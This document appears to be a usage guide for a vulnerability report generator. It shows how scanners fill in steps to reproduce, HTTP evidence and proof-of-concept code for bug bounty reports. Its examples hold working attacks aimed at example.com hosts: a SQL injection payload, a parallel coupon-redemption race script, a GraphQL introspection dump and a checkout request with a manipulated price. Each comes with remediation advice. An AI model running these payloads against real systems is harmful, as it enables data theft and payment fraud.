# REVUEX Enhanced Report Generator - Usage Guide

## New Features: Steps to Reproduce & Proof Section

Your vulnerability scanners should now populate these fields for complete technical evidence.

-----

## Required Fields for Full Documentation

### Vulnerability Object Structure

```python
vulnerability = {
    # Basic Information
    'type': 'SQL Injection',
    'severity': 'critical',
    'url': 'https://example.com/api/users',
    'endpoint': '/api/users',
    'description': 'SQL injection vulnerability in user search endpoint',
    
    # Steps to Reproduce (NEW!)
    'steps_to_reproduce': [
        "Navigate to https://example.com/search",
        "Enter the following payload in the search box: ' OR '1'='1",
        "Click the 'Search' button",
        "Observe that all user records are returned without authentication",
        "Confirm by checking the response contains sensitive user data"
    ],
    
    # OR use attack_path (backward compatible)
    'attack_path': [
        "Send GET request to /api/users?id=1' OR '1'='1",
        "Observe SQL error in response",
        "Craft payload to extract database schema",
        "Dump user credentials table"
    ],
    
    # Proof Section (NEW!)
    'request': """GET /api/users?id=1' OR '1'='1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Accept: application/json

""",
    
    'response': """HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 1234

{
  "users": [
    {
      "id": 1,
      "username": "admin",
      "password": "hashed_password_here",
      "email": "admin@example.com",
      "role": "administrator"
    },
    {
      "id": 2,
      "username": "user1",
      "password": "another_hash",
      "email": "user1@example.com"
    }
  ],
  "total": 150
}""",
    
    # Proof of Concept Code (Optional)
    'poc': """#!/usr/bin/env python3
import requests

url = "https://example.com/api/users"
payload = {"id": "1' OR '1'='1"}

response = requests.get(url, params=payload)
print(response.json())
# Expected: Returns all users without authentication
""",
    
    # Screenshots (Optional)
    'screenshots': [
        'path/to/screenshot1.png',
        'path/to/screenshot2.png'
    ],
    
    # Before/After States (Optional)
    'before_state': """Normal request:
GET /api/users?id=1

Response: Single user record""",
    
    'after_state': """Exploited request:
GET /api/users?id=1' OR '1'='1

Response: ALL user records (150 users)""",
    
    # Evidence (backward compatible)
    'evidence': 'SQL injection confirmed through error-based detection',
    
    # Remediation
    'remediation': [
        'Use parameterized queries for all database operations',
        'Implement input validation with whitelist approach',
        'Enable WAF rules for SQL injection detection'
    ],
    
    # Tags for classification
    'tags': ['database', 'injection', 'authentication'],
    
    # Timestamps (auto-added by intelligence hub)
    'discovered_at': '2025-01-15T10:30:00',
    'confirmed_at': '2025-01-15T10:45:00'
}
```

-----

## How to Integrate in Your Scanners

### Example 1: Race Condition Tester

```python
# In tools/race_tester.py

def test(self):
    """Test for race condition"""
    result = {
        'type': 'Race Condition',
        'severity': 'high',
        'url': self.endpoint,
        'description': 'Race condition allows multiple coupon redemptions',
        'exploitable': True,
        
        # Steps to Reproduce
        'steps_to_reproduce': [
            "1. Create a test account and obtain a single-use coupon code",
            "2. Open Burp Suite and capture the coupon redemption request",
            "3. Send the request to Intruder and configure for parallel execution",
            "4. Set thread count to 20 and send requests simultaneously",
            "5. Observe that the coupon is redeemed multiple times",
            "6. Check the database - coupon usage count exceeds 1"
        ],
        
        # HTTP Evidence
        'request': """POST /api/coupons/redeem HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=xyz789

{
  "coupon_code": "SUMMER2025",
  "order_id": "12345"
}""",
        
        'response': """HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "discount_applied": 50.00,
  "message": "Coupon redeemed successfully"
}""",
        
        # Proof of Concept
        'poc': """#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

def redeem_coupon():
    response = requests.post(
        'https://example.com/api/coupons/redeem',
        json={'coupon_code': 'SUMMER2025', 'order_id': '12345'},
        headers={'Cookie': 'session=xyz789'}
    )
    return response.json()

# Send 20 parallel requests
with ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(lambda _: redeem_coupon(), range(20)))

successful = [r for r in results if r.get('success')]
print(f"Successful redemptions: {len(successful)}/20")
# Expected: Multiple successes (race condition present)
""",
        
        'evidence': 'Successfully redeemed single-use coupon 15 times simultaneously',
        
        'before_state': 'Coupon usage count: 0',
        'after_state': 'Coupon usage count: 15 (should be 1)',
        
        'remediation': [
            'Implement database-level row locking on coupon redemption',
            'Use atomic operations with version checking',
            'Add idempotency keys to prevent duplicate processing',
            'Implement rate limiting on redemption endpoint'
        ]
    }
    
    return result
```

### Example 2: GraphQL Introspector

```python
# In tools/graphql_introspector.py

def scan(self):
    """Scan GraphQL endpoint"""
    vulnerabilities = []
    
    if self._check_introspection_enabled():
        vuln = {
            'type': 'GraphQL Introspection Enabled',
            'severity': 'medium',
            'url': self.target,
            'description': 'GraphQL introspection is enabled in production',
            
            'steps_to_reproduce': [
                "1. Send POST request to /graphql endpoint",
                "2. Use the introspection query in request body",
                "3. Observe complete schema is returned",
                "4. Extract all types, queries, and mutations",
                "5. Identify sensitive fields and operations"
            ],
            
            'request': """POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name type { name } } } } }"
}""",
            
            'response': """HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {"name": "id", "type": {"name": "ID"}},
            {"name": "email", "type": {"name": "String"}},
            {"name": "password", "type": {"name": "String"}},
            {"name": "creditCard", "type": {"name": "String"}}
          ]
        },
        {
          "name": "AdminQuery",
          "fields": [
            {"name": "allUsers", "type": {"name": "[User]"}},
            {"name": "deleteUser", "type": {"name": "Boolean"}}
          ]
        }
      ]
    }
  }
}""",
            
            'poc': """#!/usr/bin/env python3
import requests

introspection_query = '''
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
'''

response = requests.post(
    'https://api.example.com/graphql',
    json={'query': introspection_query}
)

schema = response.json()
print("Exposed GraphQL Schema:")
print(json.dumps(schema, indent=2))
""",
            
            'evidence': 'Complete GraphQL schema exposed including admin operations',
            
            'remediation': [
                'Disable introspection in production environments',
                'Implement field-level authorization checks',
                'Use persisted queries to prevent arbitrary query execution',
                'Add query complexity analysis and depth limiting'
            ],
            
            'tags': ['graphql', 'information_disclosure']
        }
        
        vulnerabilities.append(vuln)
    
    return vulnerabilities
```

### Example 3: Price Manipulation Scanner

```python
# In tools/price_scanner.py

def test(self):
    """Test for price manipulation"""
    result = {
        'type': 'Price Manipulation',
        'severity': 'critical',
        'url': self.endpoint,
        'description': 'Client-side price validation allows arbitrary price modification',
        'exploitable': True,
        
        'steps_to_reproduce': [
            "1. Add a $100 item to cart",
            "2. Proceed to checkout",
            "3. Intercept the checkout request with Burp Suite",
            "4. Modify the 'price' parameter from 100.00 to 0.01",
            "5. Forward the modified request",
            "6. Observe successful order completion at $0.01",
            "7. Check order confirmation email showing $0.01 total"
        ],
        
        'request': """POST /api/checkout HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Cookie: cart_id=abc123

{
  "items": [
    {
      "product_id": "PROD-001",
      "quantity": 1,
      "price": 0.01
    }
  ],
  "total": 0.01,
  "payment_method": "credit_card"
}""",
        
        'response': """HTTP/1.1 200 OK
Content-Type: application/json

{
  "order_id": "ORD-789456",
  "status": "confirmed",
  "total_paid": 0.01,
  "items": [
    {
      "product": "Premium Widget",
      "original_price": 100.00,
      "paid_price": 0.01
    }
  ],
  "message": "Order confirmed! Check your email."
}""",
        
        'poc': """#!/usr/bin/env python3
import requests

# Legitimate price
item = {
    'product_id': 'PROD-001',
    'quantity': 1,
    'price': 0.01  # Modified from 100.00
}

response = requests.post(
    'https://shop.example.com/api/checkout',
    json={
        'items': [item],
        'total': 0.01,
        'payment_method': 'credit_card'
    },
    cookies={'cart_id': 'abc123'}
)

if response.json().get('status') == 'confirmed':
    print("SUCCESS: Purchased $100 item for $0.01")
    print(f"Order ID: {response.json()['order_id']}")
""",
        
        'before_state': """Cart Total: $100.00
Payment Amount: $100.00""",
        
        'after_state': """Cart Total: $0.01 (modified)
Payment Amount: $0.01
Order Status: CONFIRMED""",
        
        'screenshots': [
            'screenshots/cart_original_price.png',
            'screenshots/burp_request_modified.png',
            'screenshots/order_confirmation_001.png'
        ],
        
        'evidence': 'Successfully purchased $100 item for $0.01 by manipulating client-side price',
        
        'remediation': [
            'Implement server-side price validation before checkout',
            'Never trust client-supplied pricing data',
            'Store authoritative prices in database and recalculate server-side',
            'Add cryptographic signatures to cart data',
            'Log all price discrepancies for fraud detection'
        ],
        
        'tags': ['payment', 'business_logic', 'ecommerce']
    }
    
    return result
```

-----

## Screenshots Best Practices

When adding screenshots to your vulnerabilities:

1. **Save screenshots to workspace:**
   
   ```python
   screenshot_path = self.workspace / f"screenshot_{vuln_id}.png"
   # Save your screenshot
   
   vulnerability['screenshots'] = [str(screenshot_path)]
   ```
1. **Recommended screenshots:**
- Original vulnerable state
- Burp Suite/proxy intercept showing modification
- Successful exploitation result
- Database/backend confirmation
1. **Screenshot naming convention:**
- `evidence_request_{timestamp}.png`
- `evidence_response_{timestamp}.png`
- `exploit_result_{timestamp}.png`

-----

## Quick Integration Checklist

For each vulnerability scanner in `tools/`:

- [ ] Add `steps_to_reproduce` array with clear, numbered steps
- [ ] Capture HTTP `request` (if applicable)
- [ ] Capture HTTP `response` (if applicable)
- [ ] Generate `poc` code showing exploitation
- [ ] Add `before_state` and `after_state` for comparison
- [ ] Save `screenshots` if visual evidence helps
- [ ] Keep backward compatible with existing `evidence` field

-----

## Result

Your reports will now include:

**Professional “Steps to Reproduce”** with step-by-step instructions  
**Complete HTTP request/response** pairs with syntax highlighting  
**Proof of Concept code** with copy-to-clipboard  
**Visual evidence** from screenshots  
**Before/After comparisons** showing impact  
**Sensitive data highlighting** in responses

This makes your reports **ready for bug bounty submission** with all the evidence security teams need!
